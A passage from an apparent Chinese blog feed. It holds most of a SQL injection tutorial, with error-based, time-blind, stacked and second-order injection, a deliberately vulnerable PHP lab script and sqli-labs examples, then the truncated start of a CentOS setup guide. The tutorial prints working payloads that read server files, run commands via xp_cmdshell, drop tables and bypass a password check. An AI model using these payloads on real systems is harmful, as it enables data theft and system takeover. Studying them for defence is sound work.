information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="Floor报错注入"><a href="#Floor报错注入" class="headerlink" title="Floor报错注入"></a>Floor报错注入</h3><p>MYSQL中用来取整的函数</p><h4 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h4><p><strong>FLOOR(x)</strong></p><p>返回小于或等于 x 的最大整数（向下取整）</p><h4 id="格式-2"><a href="#格式-2" class="headerlink" title="格式"></a>格式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat_ws(<span class="string">&#x27;-&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),(<span class="keyword">select</span> database()),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="insert-update-delete注入的利用"><a href="#insert-update-delete注入的利用" class="headerlink" title="insert update delete注入的利用"></a>insert update delete注入的利用</h3><h4 id="判断方式"><a href="#判断方式" class="headerlink" title="判断方式"></a>判断方式</h4><ol><li>数据包括<code>&#39;</code>或者 <code>\</code>时，数据无法插入，则80%是注入，20%是被拦截规则拦截掉了</li><li>带入数据库的字符串是用<code>&#39;</code>包裹的，测试数据中带有<code>&quot;</code>，如果能插入数据则90%是注入(<code>&quot;</code>不影响数据库执行的sql语句的闭合。往数据库里面插入双引号会变成单引号)。</li><li>数据中包含<code>\&#39;</code> 如果能插入数据，则 100% 证明存在注入</li><li>如果是数字参数，插入<code>sleep(5)</code>进行判断<code>_name=te1st&amp;_number=-1&#39; and sleep(5)or&#39;1&amp;_owner=Olivia</code></li></ol><p>环境代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqltest.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//error_reporting(E_ALL ^ E_DEPRECATED);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$conn</span>=mysql_connect(<span class="variable">$mysql_server_name</span>,<span class="variable">$mysql_username</span>,<span class="variable">$mysql_password</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;error connecting&quot;</span>) ; <span class="comment">//连接数据库</span></span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">&quot;set names &#x27;utf8&#x27;&quot;</span>); <span class="comment">//数据库输出编码 应该与你的数据库编码保持一致.</span></span><br><span class="line"></span><br><span class="line">mysql_select_db(<span class="variable">$mysql_database</span>); <span class="comment">//打开数据库</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_id</span>=<span class="variable">$_POST</span>[id];</span><br><span class="line"><span class="variable">$_ney</span>=<span class="string">&quot;test123&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot; insert into member__sq(p_name,p_number,p_owner,p_ney,sqdate) values(</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">&#123;$_POST[_name]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$_POST[_number]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$_POST[_owner]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$_ney&#125;</span>&#x27;) &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="comment">//insert into member__sq(p_name,p_number,p_owner,p_ney,sqdate) values(&#x27;te1st&#x27;,&#x27;51&#x27;,&#x27;me&#x27;,&#x27;test123&#x27;) and 1=1//&#x27;,&#x27;1511233968&#x27;) </span></span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="keyword">if</span>(mysql_affected_rows()==<span class="string">&quot;-1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">&quot;&lt;br&gt;&quot;</span>.mysql_error();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sucess!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mysql_server_name</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>; <span class="comment">//改成自己的mysql数据库服务器</span></span><br><span class="line"><span class="variable">$mysql_username</span>=<span class="string">&#x27;root&#x27;</span>; <span class="comment">//改成自己的mysql数据库用户名</span></span><br><span class="line"><span class="variable">$mysql_password</span>=<span class="string">&#x27;phpstudyadmin&#x27;</span>; <span class="comment">//改成自己的mysql数据库密码</span></span><br><span class="line"><span class="variable">$mysql_database</span>=<span class="string">&#x27;security&#x27;</span>; <span class="comment">//改成自己的mysql数据库名</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>基于insert下的报错，其他同理：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829112841443.png" alt="image-20210829112841443"></p><blockquote><p>这里相当于在闭合引号也可以写成<code>owner=Olivia&#39; or updatexml(1,concat(0x7e,user(),0x7e),1) or &#39;1</code></p></blockquote><h4 id="猜测增删改列的个数-，利用成功执行注入"><a href="#猜测增删改列的个数-，利用成功执行注入" class="headerlink" title="猜测增删改列的个数 ，利用成功执行注入"></a>猜测增删改列的个数 ，利用成功执行注入</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210828220950419.png" alt="image-20210828220950419"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间注入利用<code>sleep()</code>和<code>benchmark()</code>等函数让sql语句执行时间更长</p><h3 id="判断是否存在时间盲注"><a href="#判断是否存在时间盲注" class="headerlink" title="判断是否存在时间盲注"></a>判断是否存在时间盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and sleep(5)</span><br></pre></td></tr></table></figure><h3 id="sleep函数判断页面响应时间"><a href="#sleep函数判断页面响应时间" class="headerlink" title="sleep函数判断页面响应时间"></a>sleep函数判断页面响应时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#if(判断条件，为true时执行，为false时执行)</span><br><span class="line">and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5))</span><br><span class="line">and if(substring(database(),1,1)=&#x27;a&#x27;,sleep(3),null)</span><br><span class="line">#Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次</span><br><span class="line">benchmark(100000000,md(5))</span><br><span class="line"># 其他数据库</span><br><span class="line">PostgreSQL</span><br><span class="line">PG_sleep(5)</span><br><span class="line">Generate_series(1,1000000)</span><br><span class="line">SQLServer</span><br><span class="line">waitfor delay  &#x27;0:0:5&#x27;</span><br></pre></td></tr></table></figure><h3 id="payload-a"><a href="#payload-a" class="headerlink" title="payload a"></a>payload a</h3><p><code>(select * from (select user())a)</code></p><p>1、先查询 select user() 这里面的语句，将这里面查询出来的数据作为一个结果集 取名为 a<br>2、然后 再 select * from a 查询a ,将 结果集a 全部查询出来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> sleep(<span class="number">2</span>))a)</span><br><span class="line">(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span>(if (length(database())<span class="operator">&gt;</span><span class="number">1</span>, sleep(<span class="number">3</span>),<span class="number">0</span>)))a)</span><br><span class="line">(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span>(if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)))a)(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span>(if(length(database())<span class="operator">&gt;</span><span class="number">2</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)))a)</span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="union注入和堆叠注入的区别"><a href="#union注入和堆叠注入的区别" class="headerlink" title="union注入和堆叠注入的区别"></a>union注入和堆叠注入的区别</h3><p><code>union</code>或者<code>union all</code>执行的语句类型是有限的，可以用来执行查询语句，且在 MySQL 中返回的列数需要相等；而堆叠注入可以执行的是任意的语句。</p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>堆叠注入并不是在每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，同时权限不足也会使攻击者无法修改数据或者调用一些程序。<br>虽然前面提到了堆叠查询可以执行任意的 SQL 语句，但是这种注入方式并不是十分完美。在我们的 Web 系统中，代码通常<strong>只返回一个查询结果</strong>，因此堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面无法看到返回结果。<br>因此在读取数据时，建议使用<code>union</code>注入。同时在使用堆叠注入之前，我们也需要知道一些数据库相关信息如表名，列名等。</p><h3 id="数据库实例"><a href="#数据库实例" class="headerlink" title="数据库实例"></a>数据库实例</h3><p>下面介绍几个常用数据库的堆叠操作：基本操作与增删查改。</p><h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><ol><li>新建表<code>test</code><br><code>select * from users where id=1;create table test like users;</code></li><li>删除新建表<code>test</code><br><code>select * from users where id=1;drop table test;</code></li><li>查询数据<br><code>select * from users where id=1;select 1,2,3;</code></li><li>加载文件<br><code>select * from users where id=1;select load_file(&#39;d:/test.php&#39;);</code></li><li>修改数据<br><code>select * from users where id=1;insert into users(id,username,password) values(&#39;100&#39;,&#39;name&#39;,&#39;pswd&#39;);</code></li></ol><p><strong>load_file()函数</strong></p><ul><li>读取文件并返回文件内容为字符串。</li><li>要使用此函数，<strong>文件必须位于服务器主机</strong>上，必须指定<strong>完整路径</strong>的文件，而且必须有<strong>FILE权限</strong>；该文件<strong>所有字节可读</strong>，但文件<strong>内容必须小于</strong><code>max_allowed_packet</code></li><li>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回<code>NULL</code></li></ul><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829150420743.png" alt="image-20210829150420743"><br><strong>注意：</strong>这里还是有数据导入导出权限的问题。</p><p><strong>secure-file-priv字段</strong> ： <code>secure-file-priv</code>参数是用来限制<code>LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()</code>传到哪个指定目录的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li><code>ure_file_priv</code>的值为<code>null</code> ，表示限制mysqld 不允许导入|导出</li><li>当<code>secure_file_priv</code>的值为<code>/tmp/</code> ，表示限制mysqld 的导入|导出只能发生在<code>/tmp/</code>目录下</li><li>当<code>secure_file_priv</code>的值没有具体值时，表示不对mysqld 的导入|导出做限制</li></ul><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829151716423.png" alt="image-20210829151716423"></p><blockquote><p>默认的为NULL。即不允许导入导出。</p><p>修改mysql.ini 文件，在[mysqld] 下加入</p><p>secure_file_priv =</p><p>保存，重启mysql。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829152519639.png" alt="image-20210829152519639"></p><p>再次执行</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829154142239.png" alt="image-20210829154142239"></p><blockquote><p>在navicat中执行就会是这样的，要换做命令行执行</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829154119940.png" alt="image-20210829154119940"></p><p><strong>注意：</strong>在 MySQL 中，需要注意路径转义的问题，即用<code>/</code>或<code>\\</code>分隔。</p><p><a href="https://www.cnblogs.com/devcjq/articles/6409470.html">MySQL里设置或修改系统变量的几种方法</a></p><p>这里有修改系统变量的几种方法，可以考虑注入时涉及文件操作时先修改权限。</p><h4 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h4><ol><li>新建表<br><code>select * from test;create table test2(ss CHAR(8));</code></li><li>删除新建表<br><code>select * from test;drop table test2;</code></li><li>查询数据<br><code>select * from test;select 1,2,3;</code></li><li>修改数据<br><code>select * from test;update test set name=&#39;name&#39; where id=1;</code></li><li>SQL Server中最为重要的存储过程的执行<br><code>select * from test where id=1;exec master..xp_cmdshell &#39;ipconfig&#39;</code></li></ol><h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><p><strong>Oracle 不能使用堆叠注入</strong>，可以从图中看到，当有两条语句在同一行时，直接报错无效字符。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829154707616.png" alt="image-20210829154707616"></p><h4 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h4><ol><li>新建表<br><code>select * from user_test;create table user_data(id DATE);</code></li><li>删除新建表<br><code>select * from user_test;delete from user_data;</code></li><li>查询数据<br><code>select * from user_test;select 1,2,3;</code></li><li>修改数据<br><code>select * from user_test;update user_test set name=&#39;new&#39; where name=&#39;name&#39;;</code></li></ol><h5 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h5><p>堆叠注入需要依靠前文所写的各种注入方式来获取数据库的信息，在这里只演示如何插入新的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`http://localhost:8088/sqlilabs/Less-38/?id=1&#x27;;insert into users(id,username,password) values(38,&#x27;Less38&#x27;,&#x27;Less38&#x27;)--+`</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829154911637.png" alt="image-20210829154911637"></p><h2 id="特殊注入点"><a href="#特殊注入点" class="headerlink" title="特殊注入点"></a>特殊注入点</h2><h3 id="Http-Header注入"><a href="#Http-Header注入" class="headerlink" title="Http Header注入"></a>Http Header注入</h3><p>后台开发人员为了验证客户端头信息（比如常用的cookie验证）或者通过<code>http header</code>头信息获取客户端的一些信息，比如<code>useragent</code>,<code>accept</code>字段等等。<br>会对客户端的<code>http header</code>信息进行获取并使用SQL进行处理，如果此时没有足够的安全考虑则可能会导致基于<code>http header</code>的SQL注入漏洞。</p><h3 id="错误-POST-User-Agent-请求头注入"><a href="#错误-POST-User-Agent-请求头注入" class="headerlink" title="错误_POST_User-Agent_请求头注入"></a>错误_POST_User-Agent_请求头注入</h3><p><code>&#39; or updatexml(1 , concat(&#39;#&#39;,(database())),0) , &#39;&#39;,&#39;&#39;) #</code></p><p><strong>注意</strong>：这里并不是URL而是HTTP头，所以<code>+</code>并不会被转义为(空格)，于是末尾的注释符号要变为<code>#</code></p><h3 id="错误-POST-Referer-请求头注入"><a href="#错误-POST-Referer-请求头注入" class="headerlink" title="错误_POST_Referer_请求头注入"></a>错误_POST_Referer_请求头注入</h3><p><code>&#39; or updatexml(1,concat(&#39;#&#39;, (database())),0), 0)#</code></p><h3 id="二次注入（存储型注入）"><a href="#二次注入（存储型注入）" class="headerlink" title="二次注入（存储型注入）"></a>二次注入（存储型注入）</h3><p>导致 SQL 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 SQL 注入</p><h4 id="二次注入的一般过程："><a href="#二次注入的一般过程：" class="headerlink" title="二次注入的一般过程："></a>二次注入的一般过程：</h4><ol><li>通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了构造的 SQL 语句或者命令。</li><li>服务端应用程序会将提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li><li>向服务端发送第二个与第一次不相同的请求数据信息。</li><li>服务端接收到提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。</li><li>服务端返回执行的处理结果数据信息，便可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</li></ol><h4 id="当登录界面对username和password都做了过滤"><a href="#当登录界面对username和password都做了过滤" class="headerlink" title="当登录界面对username和password都做了过滤"></a>当登录界面对username和password都做了过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br></pre></td></tr></table></figure><p><strong>当注入点在修改密码处：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">&#x27;$pass&#x27;</span> WHERE username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>将其改变为：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">&#x27;$pass&#x27;</span> WHERE username=<span class="string">&#x27;$username&#x27;</span>-- <span class="keyword">and</span> password=<span class="string">&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure><p>且已知注册时未有任何过滤，闭合查询语句为单引号，即在注册用户时构造<code>admin&#39;--</code> (有空格)或<code>admin&#39;#</code>。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.admintony.com/SQL%E6%B3%A8%E5%85%A5-insert%E3%80%81update%E3%80%81delete%E6%B3%A8%E5%85%A5.html">SQL注入-insert、update、delete注入</a></p><p><a href="https://www.cnblogs.com/missmzt/p/7676800.html">windows下mysql loadfile返回NULL的解决</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux初始化</title>
      <link href="/p/79dc0da1.html"/>
      <url>/p/79dc0da1.html</url>
      
        <content type="html"><![CDATA[<p>工作的时候经常会创建很多Linux主机，为了使这些机器马上能有生产力，写一个关于初始化它们的文档</p><h2 id="Centos初始化"><a href="#Centos初始化" class="headerlink" title="Centos初始化"></a>Centos初始化</h2><h3 id="添加sudo权限"><a href="#添加sudo权限" class="headerlink" title="添加sudo权限"></a>添加sudo权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su</span><br><span class="line">chmod u+w /etc/sudoers</span><br><span class="line">vi /etc/sudoers</span><br><span class="line">username ALL=(ALL) NOPASSWD: ALL</span><br><span class="line">chmod u-w /etc/sudoers</span><br></pre></td></tr></table></figure><blockquote><p>如果没有还原权限后续执行sudo会报错<code>chmod 0440 /etc/sudoers</code></p></blockquote><h3 id="更改yum源"><a href="#更改yum源" class="headerlink" title="更改yum源"></a>更改yum源</h3><p><strong>centos8</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo</span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure><h3 id="开启ssh"><a href="#开启ssh" class="headerlink" title="开启ssh"></a>开启ssh</h3><p>检测是否安装ssh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum list installed | grep openssh-server</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install openssh-server</span><br></pre></td></tr></table></figure><p>配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">Port 22</span><br><span class="line"><span class="meta">#</span><span class="bash">AddressFamily any</span></span><br><span class="line">ListenAddress 0.0.0.0</span><br><span class="line">ListenAddress ::</span><br></pre></td></tr></table></figure><p>开启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service sshd start</span><br></pre></td></tr></table></figure><p>检测 sshd服务是否开启 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -e | grep sshd</span><br></pre></td></tr></table></figure><p>检测 22 号端口是否开启 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an | grep 22</span><br></pre></td></tr></table></figure><p>将 sshd 服务设置为开机自启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable sshd.service</span><br></pre></td></tr></table></figure><p>检测是否开启开机自动启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files | grep sshd</span><br></pre></td></tr></table></figure><h3 id="重新设置root密码"><a href="#重新设置root密码" class="headerlink" title="重新设置root密码"></a>重新设置root密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><h3 id="配置IP"><a href="#配置IP" class="headerlink" title="配置IP"></a>配置IP</h3><p>修改<code>/etc/sysconfig/network-scripts/</code> 目录下的网卡文件来配置系统的IP地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOTPROTO=&quot;static&quot; #dhcp改为static </span><br><span class="line">ONBOOT=&quot;yes&quot; #开机启用本配置</span><br><span class="line">IPADDR=192.168.7.106 #静态IP</span><br><span class="line">GATEWAY=192.168.7.1 #默认网关</span><br><span class="line">NETMASK=255.255.255.0 #子网掩码</span><br><span class="line">DNS1=192.168.7.1 #DNS 配置</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure><h4 id="开启DHCP"><a href="#开启DHCP" class="headerlink" title="开启DHCP"></a>开启DHCP</h4><p>设置网卡配置文件：<code>ONBOOT = YES</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/network restart</span><br></pre></td></tr></table></figure><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211104094754060.png" alt="image-20211104094754060" style="zoom: 150%;" /><h3 id="设置时区和时间"><a href="#设置时区和时间" class="headerlink" title="设置时区和时间"></a>设置时区和时间</h3><h4 id="查看当前时区"><a href="#查看当前时区" class="headerlink" title="查看当前时区"></a>查看当前时区</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl</span><br></pre></td></tr></table></figure><h4 id="列出所有可用时区"><a href="#列出所有可用时区" class="headerlink" title="列出所有可用时区"></a>列出所有可用时区</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl list-timezones</span><br></pre></td></tr></table></figure><h4 id="设置上海时区"><a href="#设置上海时区" class="headerlink" title="设置上海时区"></a>设置上海时区</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo timedatectl set-timezone Asia/Shanghai</span><br></pre></td></tr></table></figure><blockquote><p>查看是否修改成功：<code>date</code> Fri Dec 14 10:48:05 CST 2018 如果显示CST则说明时区设置成功</p></blockquote><h4 id="查看时间和修改时间"><a href="#查看时间和修改时间" class="headerlink" title="查看时间和修改时间"></a>查看时间和修改时间</h4><p><strong>显示时间 :</strong>  <code>date</code></p><p><strong>修改时间</strong><code>date -s [time]</code></p><p>如：设置当前时间为：2018年12月10点50分</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date -s  ‘2018-12-14 10:50:00’</span><br></pre></td></tr></table></figure><p><strong>根据网络同步时间</strong></p><p>使用ntp同步标准时间，ntp：网络时间协议（network time protol）</p><p>安装：<code>yum install ntp</code></p><p>同步1：<code>ntpdate pool.ntp.org</code></p><p>同步2：<code>ntpdate -u ntp1.aliyun.com</code></p><p><strong>写入计划任务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0-59/10 * * * * /usr/sbin/ntpdate ntp1.aliyun.com | logger -t NTP</span><br><span class="line"># 或者</span><br><span class="line">0-59/10 * * * * /usr/sbin/ntpdate us.pool.ntp.org | logger -t NTP  </span><br></pre></td></tr></table></figure><h3 id="开启Telnet"><a href="#开启Telnet" class="headerlink" title="开启Telnet"></a>开启Telnet</h3><p>检查是否存在<code>telnet-server/telnet</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep telnet</span><br><span class="line"></span><br><span class="line">telnet-server-0.17-76.el8.x86_64</span><br><span class="line">telnet-0.17-76.el8.x86_64</span><br></pre></td></tr></table></figure><p>如不存在，安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install telnet-server</span><br><span class="line">yum install telnet</span><br></pre></td></tr></table></figure><p>安装xinetd</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install xinetd </span><br></pre></td></tr></table></figure><p>开启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 